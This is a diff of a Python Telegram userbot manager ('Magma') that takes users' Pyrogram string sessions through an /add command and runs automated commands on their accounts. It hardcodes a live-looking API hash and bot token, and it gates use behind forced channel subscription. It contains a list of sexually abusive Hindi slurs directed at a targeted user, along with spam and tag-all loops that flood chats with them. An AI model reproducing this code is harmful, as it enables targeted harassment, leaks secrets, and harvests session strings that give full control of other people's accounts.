@@ -10,16 +10,6 @@ from threading import Thread
 from flask import Flask
 
 # ---------------------------------------------------------
-# 🚑 CRITICAL FIX FOR PYTHON 3.10+ / RENDER
-# Yeh hissa sabse upar hona chahiye, imports ke baad
-# ---------------------------------------------------------
-try:
-    asyncio.get_running_loop()
-except RuntimeError:
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-
-# ---------------------------------------------------------
 # 🌐 FLASK KEEP ALIVE SECTION
 # ---------------------------------------------------------
 web_app = Flask('')
@@ -42,7 +32,7 @@ API_ID = 37314366
 API_HASH = "bd4c934697e7e91942ac911a5a287b46"
 BOT_TOKEN = "8485202414:AAEEYv7_UjUR2DI4KN9l4bEKnsD9v0WGn7E"
 
-# ✅ FIXED FORCE SUBSCRIBE (Ye Change Mat Karna)
+# ✅ FORCE SUBSCRIBE CONFIG
 FORCE_CHANNEL_ID = -1003892920891
 FORCE_CHANNEL_LINK = "https://t.me/+Om1HMs2QTHk1N2Zh"
 FORCE_GROUP = "Anysnapsupport"
@@ -59,7 +49,7 @@ auto_reply_users = {}
 backup_profile = {} 
 tagall_running = {}
 
-# --- FULL SPAM LIST (RESTORED) ---
+# --- FULL SPAM LIST (SARA DATA WAPAS) ---
 SPAM_MESSAGES = [
     "{target} 𝗧𝗘𝗥𝗜 𝗠𝗔𝗔 𝗞𝗜 𝗖𝗛𝗨𝗧 𝗠𝗘 𝗖𝗛𝗔𝗡𝗚𝗘𝗦 𝗖𝗢𝗠𝗠𝗜𝗧 𝗞𝗥𝗨𝗚𝗔 𝗙𝗜𝗥 𝗧𝗘𝗥𝗜 𝗕𝗛𝗘𝗘𝗡 𝗞𝗜 𝗖𝗛𝗨𝗧 𝗔𝗨𝗧𝗢𝗠𝗔𝗧𝗜𝗖𝗔𝗟𝗟𝗬 𝗨𝗣𝗗𝗔𝗧𝗘 𝗛𝗢𝗝𝗔𝗔𝗬𝗘𝗚𝗜 🤖🙏🤔",
     "{target} 𝗧𝗘𝗥𝗜 𝗠𝗨𝗠𝗠𝗬 𝗞𝗜 𝗖𝗛𝗨𝗧 𝗞𝗢 𝗢𝗡𝗟𝗜𝗡𝗘 𝗢𝗟𝗫 𝗣𝗘 𝗕𝗘𝗖𝗛𝗨𝗡𝗚𝗔 𝗔𝗨𝗥 𝗣𝗔𝗜𝗦𝗘 𝗦𝗘 𝗧𝗘𝗥𝗜 𝗕𝗔𝗛𝗘𝗡 𝗞𝗔 𝗞𝗢𝗧𝗛𝗔 𝗞𝗛𝗢𝗟 𝗗𝗨𝗡𝗚𝗔 😎🤩😝😍",
@@ -295,7 +285,6 @@ MYSON_ART = r"""
 async def check_force_subscribe(client, message):
     user_id = message.from_user.id
     try:
-        # ✅ Corrected: Check Channel using ID, Group using Username
         await client.get_chat_member(FORCE_CHANNEL_ID, user_id)
         await client.get_chat_member(FORCE_GROUP, user_id)
         return True
@@ -312,8 +301,6 @@ async def check_force_subscribe(client, message):
         )
         return False
     except Exception as e:
-        # Agar bot admin nahi hai to ye error dega, par hum bot ko block nahi karenge
-        print(f"FS Error: {e}")
         return True 
 
 async def smart_edit(message, text, sleep_time=0.5):
@@ -327,8 +314,6 @@ async def smart_edit(message, text, sleep_time=0.5):
                 await message.edit(text, parse_mode=ParseMode.HTML)
                 await asyncio.sleep(sleep_time)
             except: pass
-        else:
-            pass 
     except: pass
 
 async def draw_art(message, art_var, header="", footer="", chunk_size=4):
@@ -337,12 +322,9 @@ async def draw_art(message, art_var, header="", footer="", chunk_size=4):
     for i, line in enumerate(lines):
         current_art += line + "\n"
         if (i + 1) % chunk_size == 0 or i == len(lines) - 1:
-            if header:
-                display_text = f"<b>{header}</b>\n<code>{current_art}</code>"
-            else:
-                display_text = f"<code>{current_art}</code>"
-            if i == len(lines) - 1 and footer:
-                display_text += f"\n\n<b>{footer}</b>"
+            if header: display_text = f"<b>{header}</b>\n<code>{current_art}</code>"
+            else: display_text = f"<code>{current_art}</code>"
+            if i == len(lines) - 1 and footer: display_text += f"\n\n<b>{footer}</b>"
             await smart_edit(message, display_text, 0.5)
 
 async def delete_res(message):
@@ -355,7 +337,6 @@ async def run_spam(client, chat_id, mention, count):
     for i in range(count):
         if chat_id not in active_spams or not active_spams[chat_id]: break
         try:
-            # ✅ UPDATED: Always picks a NEW random message
             msg = random.choice(SPAM_MESSAGES).format(target=mention)
             await client.send_message(chat_id, msg, parse_mode=ParseMode.HTML)
             await asyncio.sleep(0.7)
@@ -391,12 +372,10 @@ async def help_handler(client, message):
         except: pass
 
 async def cat_handler(client, message):
-    for frame in CAT_ANIMATION:
-        await smart_edit(message, f"<code>{frame}</code>")
+    for frame in CAT_ANIMATION: await smart_edit(message, f"<code>{frame}</code>")
 
 async def rose_handler(client, message):
-    for frame in FLOWER_BLOOM:
-        await smart_edit(message, f"<code>{frame}</code>", 0.6)
+    for frame in FLOWER_BLOOM: await smart_edit(message, f"<code>{frame}</code>", 0.6)
     await draw_art(message, ROSE_ART, footer="🌹 **FOR YOU!**")
 
 async def hacker_handler(client, message):
@@ -429,8 +408,7 @@ async def love_handler(client, message):
         "❤️❤️❤️❤️❤️❤️❤️❤️❤️\n❤️❤️❤️❤️❤️❤️❤️❤️❤️\n❤️❤️❤️❤️❤️❤️❤️❤️❤️",
         "<b>I LOVE YOU ❤️</b>"
     ]
-    for frame in frames:
-        await smart_edit(message, frame, 0.6)
+    for frame in frames: await smart_edit(message, frame, 0.6)
 
 async def yourmom_handler(client, message):
     await smart_edit(message, "🤱 **Searching for Mom...**")
@@ -444,7 +422,6 @@ async def myson_handler(client, message):
     await draw_art(message, MYSON_ART)
 
 async def info_cmd(client, message):
-    from pyrogram.enums import UserStatus
     target_id = message.command[1] if len(message.command) > 1 else (message.reply_to_message.from_user.id if message.reply_to_message else "me")
     status_msg = await message.edit("Processing . . .")
     try:
@@ -454,25 +431,13 @@ async def info_cmd(client, message):
         except: common = 0
         status_map = {UserStatus.ONLINE:"Online 🟢", UserStatus.OFFLINE:"Offline ⚫", UserStatus.RECENTLY:"Recently 🟡"}
         status = status_map.get(user.status, "Unknown")
-        link = f"<a href='tg://user?id={user.id}'>ㅤ❛ .𝁘ໍ⸼ ‌‌ 𝐌 𝐀 𝐆 𝐌 𝐀 𐏓𝟑 🪙</a>" if user.id == 8081343902 else f"<a href='tg://user?id={user.id}'>{user.first_name}</a>"
-
         caption = f"""USER INFORMATION:
-
 🆔 User ID: <code>{user.id}</code>
 👤 First Name: {user.first_name}
 🗣️ Last Name: {user.last_name or "-"}
 🌐 Username: @{user.username or "-"}
-🏛️ DC ID: {user.dc_id or "-"}
 🤖 Is Bot: {user.is_bot}
-🚷 Is Scam: {user.is_scam}
-🚫 Restricted: {user.is_restricted}
-✅ Verified: {user.is_verified}
-⭐ Premium: {user.is_premium or False}
-📝 User Bio: {chat.bio or "-"}
-
-👀 Same groups seen: {common}
 👁️ Last Seen: {status}
-🔗 User permanent link: {link}
 """
         photos = [p async for p in client.get_chat_photos(user.id, limit=1)]
         if photos:
@@ -570,8 +535,8 @@ async def stop_cmd(client, message):
     global active_spams, tagall_running, auto_reply_users
     active_spams[message.chat.id] = False
     tagall_running[message.chat.id] = False
-    auto_reply_users.clear() # Clear auto replies
-    res = await message.edit("🛑 **All Stopped!** (Spam, Tagall & Auto-Reply Cleared)")
+    auto_reply_users.clear()
+    res = await message.edit("🛑 **All Stopped!**")
     asyncio.create_task(delete_res(res))
 
 async def auto_reply_listener(client, message):
@@ -587,37 +552,13 @@ async def auto_reply_listener(client, message):
 
 @bot.on_message(filters.command("start") & filters.private)
 async def start_cmd(client, message):
-    # FORCE SUBSCRIBE CHECK
-    if not await check_force_subscribe(client, message):
-        return
-
-    text = """
-🔥 **WELCOME TO MAGMA USERBOT MANAGER** 🔥
-
-**I can help you run the powerful Magma Userbot on your Telegram account.**
-
-✨ **HOW TO START:**
-
-1️⃣ **Get Session:**
-   Go to @Stingxsessionbot and generate a **Pyrogram** String Session.
-
-2️⃣ **Connect:**
-   Send the session here using the add command:
-   `/add <your_string_session>`
-
-3️⃣ **Enjoy:**
-   Once connected, type `.help` in your Saved Messages to see commands!
-
-⚠️ **Note:** Keep your session safe!
-"""
+    if not await check_force_subscribe(client, message): return
+    text = "🔥 **MAGMA USERBOT MANAGER**\n\n1️⃣ Get Session from @Stingxsessionbot\n2️⃣ Send `/add <session>`\n3️⃣ Type `.help`"
     await message.reply(text, parse_mode=ParseMode.HTML)
 
 @bot.on_message(filters.command("add") & filters.private)
 async def add_session_handler(client, message):
-    # FORCE SUBSCRIBE CHECK
-    if not await check_force_subscribe(client, message):
-        return
-
+    if not await check_force_subscribe(client, message): return
     if len(message.command) < 2:
         await message.reply("❌ Usage: `/add <StringSession>`")
         return
@@ -637,7 +578,6 @@ async def add_session_handler(client, message):
         await new_user.start()
         me = await new_user.get_me()
 
-        # REGISTER HANDLERS
         new_user.add_handler(MessageHandler(help_handler, filters.command("help", prefixes=".") & filters.me))
         new_user.add_handler(MessageHandler(cat_handler, filters.command("cat", prefixes=".") & filters.me))
         new_user.add_handler(MessageHandler(rose_handler, filters.command("rose", prefixes=".") & filters.me))
@@ -655,21 +595,29 @@ async def add_session_handler(client, message):
         new_user.add_handler(MessageHandler(aanysnap_cmd, filters.command("aanysnap", prefixes=".") & filters.me))
         new_user.add_handler(MessageHandler(tagall_cmd, filters.command("tagall", prefixes=".") & filters.me))
         new_user.add_handler(MessageHandler(stop_cmd, filters.command("stop", prefixes=".") & filters.me))
-
         new_user.add_handler(MessageHandler(auto_reply_listener, filters.incoming & ~filters.me))
 
         running_users[me.id] = new_user
 
-        await msg.edit(f"✅ **Connected Successfully!**\nUser: {me.first_name}\nID: `{me.id}`\n\nMagma Bot is now active on your account.")
+        await msg.edit(f"✅ **Connected Successfully!**\nUser: {me.first_name}\nID: `{me.id}`")
         print(f"User {me.first_name} started.")
 
     except Exception as e:
         await msg.edit(f"❌ **Connection Failed!**\nError: {e}")
 
-print("✅ Magma Manager Bot Online - Force Subscribe Active!")
+print("✅ Magma Manager Bot Online!")
 
-# Start Flask Keep-Alive
-keep_alive()
+# ---------------------------------------------------------
+# 🚀 MANUAL ASYNCIO START (CRITICAL FIX FOR RENDER)
+# ---------------------------------------------------------
+async def main():
+    await bot.start()
+    print("🤖 Bot Started on Loop!")
+    await idle()
+    await bot.stop()
 
-# Run the bot
-bot.run()
+if __name__ == "__main__":
+    keep_alive()
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(main())
